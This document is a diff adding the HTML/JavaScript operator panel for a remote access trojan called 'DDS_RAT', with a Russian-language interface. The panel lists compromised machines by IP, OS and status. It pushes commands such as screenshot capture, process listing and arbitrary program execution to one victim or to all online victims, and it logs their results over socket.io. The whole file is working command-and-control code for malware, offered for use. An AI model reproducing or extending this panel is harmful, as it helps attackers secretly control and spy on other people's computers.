@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>DDS_RAT Панель</title>
+    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+    <style>
+        body { background:#0b0b0b; color:#0f0; font-family:monospace; padding:20px; }
+        table { border-collapse:collapse; width:100%; margin-top:20px; }
+        th, td { border:1px solid #0f0; padding:10px; text-align:left; }
+        th { background:#1a1a1a; }
+        .online { color:#0f0; }
+        .offline { color:#f44; }
+        .cmd-box { display:flex; gap:10px; margin:20px 0; flex-wrap:wrap; }
+        .cmd-box input { flex:1; background:#111; border:1px solid #0f0; color:#0f0; padding:10px; min-width:200px; }
+        .cmd-box button { background:#0f0; color:#000; border:none; padding:10px 20px; cursor:pointer; }
+        .log { background:#111; border:1px solid #0f0; height:200px; overflow-y:auto; padding:10px; margin-top:15px; }
+        .status-bar { background:#1a1a1a; padding:10px; border-left:4px solid #0f0; margin-bottom:15px; }
+    </style>
+</head>
+<body>
+<h1>⚡ DDS_RAT Control Panel (Render)</h1>
+<div class="status-bar" id="status">⏳ Подключение к серверу...</div>
+<div class="cmd-box">
+    <input type="text" id="cmdInput" placeholder="Команда: screenshot, list_processes, exec:calc.exe" />
+    <button onclick="sendCmd()">📨 Всем онлайн</button>
+    <button onclick="sendCmdToSelected()">🎯 Выбранному</button>
+    <button onclick="refreshClients()">🔄 Обновить</button>
+</div>
+<table>
+    <thead><tr><th>ID</th><th>IP</th><th>OS</th><th>Статус</th><th>Последнее</th><th>Действие</th></tr></thead>
+    <tbody id="clientsTable"></tbody>
+</table>
+<div class="log" id="log">[DDS] Журнал команд...</div>
+
+<script>
+    let socket = null;
+    let selectedClient = null;
+    let serverHost = window.location.hostname;
+
+    function initSocket() {
+        socket = io('https://' + serverHost);
+        socket.on('connect', () => {
+            document.getElementById('status').innerHTML = '✅ Соединение с сервером установлено';
+        });
+        socket.on('command_done', (data) => {
+            appendLog(`[${data.client_id.substring(0,8)}] ✅ ${data.result.substring(0,150)}...`);
+        });
+        socket.on('disconnect', () => {
+            document.getElementById('status').innerHTML = '❌ Отключено от сервера';
+        });
+    }
+
+    function appendLog(msg) {
+        const log = document.getElementById('log');
+        log.innerHTML += `<div>${new Date().toLocaleTimeString()} - ${msg}</div>`;
+        log.scrollTop = log.scrollHeight;
+    }
+
+    async function refreshClients() {
+        try {
+            const resp = await fetch('/api/clients');
+            const clients = await resp.json();
+            const tbody = document.getElementById('clientsTable');
+            tbody.innerHTML = '';
+            clients.forEach(c => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td>${c.id.substring(0,8)}</td>
+                    <td>${c.ip}</td>
+                    <td>${c.os_info || 'N/A'}</td>
+                    <td class="${c.status === 'online' ? 'online' : 'offline'}">${c.status}</td>
+                    <td>${new Date(c.last_seen * 1000).toLocaleString()}</td>
+                    <td><button onclick="selectClient('${c.id}')">Выбрать</button></td>
+                `;
+                tbody.appendChild(tr);
+            });
+        } catch(e) {
+            appendLog('⚠️ Ошибка обновления списка: ' + e);
+        }
+    }
+
+    function selectClient(id) {
+        selectedClient = id;
+        document.getElementById('status').innerHTML = `✅ Выбран клиент: ${id.substring(0,8)}`;
+    }
+
+    async function sendCmd() {
+        const cmd = document.getElementById('cmdInput').value.trim();
+        if (!cmd) return;
+        const clients = await fetch('/api/clients').then(r => r.json());
+        let sent = 0;
+        for (let c of clients) {
+            if (c.status === 'online') {
+                await fetch('/api/command', {
+                    method: 'POST',
+                    headers: {'Content-Type':'application/json'},
+                    body: JSON.stringify({client_id: c.id, command: cmd})
+                });
+                sent++;
+            }
+        }
+        appendLog(`[ALL] Команда "${cmd}" отправлена ${sent} клиентам`);
+    }
+
+    async function sendCmdToSelected() {
+        if (!selectedClient) { alert('Сначала выберите клиента'); return; }
+        const cmd = document.getElementById('cmdInput').value.trim();
+        if (!cmd) return;
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({client_id: selectedClient, command: cmd})
+        });
+        appendLog(`[${selectedClient.substring(0,8)}] Команда "${cmd}" отправлена`);
+    }
+
+    initSocket();
+    refreshClients();
+    setInterval(refreshClients, 5000);
+</script>
+</body>
+</html>
